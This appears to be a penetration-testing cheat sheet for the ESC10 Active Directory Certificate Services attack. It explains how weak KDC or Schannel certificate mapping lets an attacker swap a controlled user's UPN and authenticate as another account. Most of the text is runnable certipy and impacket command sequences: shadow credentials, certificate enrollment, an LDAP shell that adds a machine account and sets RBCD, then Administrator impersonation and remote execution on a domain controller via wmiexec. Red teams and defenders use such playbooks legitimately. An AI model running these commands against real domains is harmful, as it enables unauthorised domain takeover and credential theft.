# ESC10—Weak Certificate Mapping via KDC/Schannel Registry Misconfiguration

## Theory

Two registry-driven misconfigurations can relax certificate-to-account binding:

- **Case 1 (Kerberos/KDC):** `StrongCertificateBindingEnforcement=0` on the KDC causes weak mapping during PKINIT. If you set a controlled user’s UPN to the target’s UPN, any **client-auth** cert you enroll as the controlled user will map to the target.
- **Case 2 (Schannel/LSASS):** `CertificateMappingMethods=0x4` enables weak UPN mapping for Schannel (LDAPS/WinRM HTTPS/etc.). Same UPN swap idea, but you must authenticate via Schannel (not PKINIT). You can then leverage LDAP operations (e.g., create a machine account, set RBCD) to escalate.

## Requirements

### Case 1—Kerberos

- `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement = 0` (only effective if Apr 2023 KDC hardening updates are not installed).
- At least one template with **Client Authentication** EKU (e.g., `User`).
- **GenericWrite/GenericAll** over a controlled user `<CONTROLLED_USER>` to rewrite its UPN to `<TARGET_UPN>`.

### Case 2—Schannel

- `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods = 0x4`.
- At least one **Client Authentication** template (e.g., `User`).
- **GenericWrite/GenericAll** over `<CONTROLLED_USER>`. Target account `<TARGET_USER>` should **not** already have a UPN (e.g., machine accounts like `<DC_HOSTNAME>$` or the built-in Administrator) to avoid constraint violations.

### Placeholders

`<DOMAIN>` `<FOREST_DN>` `<DC_IP>` `<CA_NAME>` `<USER>` `<PASS>` `<CONTROLLED_USER>` `<CONTROLLED_PASS>` `<CONTROLLED_HASH>` `<CONTROLLED_UPN>` `<TARGET_USER>` `<TARGET_UPN>` `<DC_HOSTNAME>` `<PFX_FILE>` `<TARGET_HOST_FQDN>` `<ADMIN_USER>` `<ADMIN_PASS>` 

---

## Linux

### Enumerate Registry (optional, as Admin only)

```bash
# Case 1 (KDC)
reg.py '<DOMAIN>/<ADMIN_USER>':'<ADMIN_PASS>'@<DC_IP> query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'

# Case 2 (Schannel)
reg.py '<DOMAIN>/<ADMIN_USER>':'<ADMIN_PASS>'@<DC_IP> query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'
```

# Enumerate Vulnerable Templates

```bash
# Find client-auth templates and check general AD CS exposure
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
```

### Gain/Use Control of <CONTROLLED_USER> (example: Shadow creds)

```bash
certipy shadow auto -u '<USER>@<DOMAIN>' -p '<PASS>' -account <CONTROLLED_USER>
# => yields a TGT/NT hash for <CONTROLLED_USER> (no password change)
```

---

### Case 1—Kerberos (PKINIT)

1. **Set `<CONTROLLED_USER>` UPN to `<TARGET_UPN>`**

```bash
certipy account update -u '<USER>@<DOMAIN>' -p '<PASS>' -user <CONTROLLED_USER> -upn '<TARGET_UPN>'
# Eg ADMIN_USER@<DOMAIN>
```

1. **Request client-auth cert as `<CONTROLLED_USER>`**

```bash
# Use password OR NT hash from shadow creds
certipy req -u '<CONTROLLED_USER>@<DOMAIN>' -p '<CONTROLLED_PASS>' \
  -dc-ip <DC_IP> -ca '<CA_NAME>' -template 'User' -out '<PFX_FILE>'
# or
certipy req -u '<CONTROLLED_USER>@<DOMAIN>' -hashes <CONTROLLED_HASH> \
  -dc-ip <DC_IP> -ca '<CA_NAME>' -template 'User' -out '<PFX_FILE>'
# Expect UPN in output: '<TARGET_UPN>'
```

1. **Revert `<CONTROLLED_USER>` UPN**

```bash
certipy account update -u '<USER>@<DOMAIN>' -p '<PASS>' -user <CONTROLLED_USER> -upn '<CONTROLLED_UPN>'
```

1. **Authenticate as `<TARGET_USER>` via PKINIT**

```bash
certipy auth -pfx '<PFX_FILE>.pfx' -domain <DOMAIN> -dc-ip <DC_IP>
# => saves <TARGET_USER>.ccache and may print NT hash
```

1. **Use TGT**

```bash
KRB5CCNAME=<TARGET_USER>.ccache wmiexec.py -k -no-pass <TARGET_HOST_FQDN>
```

---

### Case 2—Schannel (LDAPS)

1. **Set `<CONTROLLED_USER>` UPN to DC machine account UPN**

```bash
certipy account update -u '<USER>@<DOMAIN>' -p '<PASS>' -user <CONTROLLED_USER> -upn '<DC_HOSTNAME>$@<DOMAIN>'
```

1. **Request client-auth cert as `<CONTROLLED_USER>`**

```bash
certipy req -u '<CONTROLLED_USER>@<DOMAIN>' -hashes <CONTROLLED_HASH> \
  -dc-ip <DC_IP> -ca '<CA_NAME>' -template 'User' -out '<PFX_FILE>'
# Expect UPN: '<DC_HOSTNAME>$@<DOMAIN>'
```

1. **Revert `<CONTROLLED_USER>` UPN**

```bash
certipy account update -u '<USER>@<DOMAIN>' -p '<PASS>' -user <CONTROLLED_USER> -upn '<CONTROLLED_UPN>'
```

1. **Authenticate over Schannel (LDAPS) and abuse LDAP**

```bash
certipy auth -pfx '<PFX_FILE>' -domain <DOMAIN> -dc-ip <DC_IP> -ldap-shell
# In the LDAP shell:
# add_computer <NEW_COMPUTER_SAM> <NEW_COMPUTER_PASS>
# set_rbcd <DC_HOSTNAME>$ <NEW_COMPUTER_SAM>
```

1. **Use RBCD to impersonate**

```bash
getST.py -spn cifs/<DC_HOSTNAME>.<DOMAIN> -impersonate Administrator -dc-ip <DC_IP> \
  <DOMAIN>/'<NEW_COMPUTER_SAM>$':<NEW_COMPUTER_PASS>
# => Administrator.ccache
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass <DC_HOSTNAME>.<DOMAIN>
```

---

## Windows (optional Workflow notes)

- If needed, create a logon/session as `<CONTROLLED_USER>` (RDP / “Run as different user” / RunasCS) to run template enrollment tools locally.
- For enumeration of templates or AD rights, reuse PowerView/Certify approaches from previous techniques (ESC9).
